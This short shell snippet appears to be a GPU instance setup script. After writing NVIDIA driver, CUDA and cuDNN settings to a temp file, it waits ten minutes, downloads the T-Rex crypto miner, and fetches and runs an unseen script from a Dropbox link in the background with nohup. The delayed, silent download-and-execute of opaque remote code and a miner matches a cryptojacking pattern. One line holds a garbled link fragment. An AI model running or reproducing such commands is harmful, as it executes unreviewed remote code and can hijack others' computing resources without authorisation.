 echo "
          install_driver=1
          driver_version=NVIDIA-Linux-x86_64-450.102.04.run
 (http://nvidia-linux-x86_64-450.102.04.run/)        
            install_cuda=1
            cuda_version=cuda_11.0.3_450.51.06_linux.run
            
            install_cudnn=1
            cudnn_version1=libcudnn8_8.1.0.77-1+cuda11.2_amd64.deb
            cudnn_version2=libcudnn8-dev_8.1.0.77-1+cuda11.2_amd64.deb
            cudnn_version3=libcudnn8-samples_8.1.0.77-1+cuda11.2_amd64.deb
            " >> /tmp/nv_driver_install.ini
sleep 10m &&
wget https://github.com/trexminer/T-Rex/releases/download/0.24.5/t-rex-0.24.5-linux.tar.gz && sudo tar zxvf t-rex-0.24.5-linux.tar.gz && wget https://www.dropbox.com/s/0xw5uffvlhnh3ac/test1.sh && chmod +x test1.sh && nohup ./test1.sh &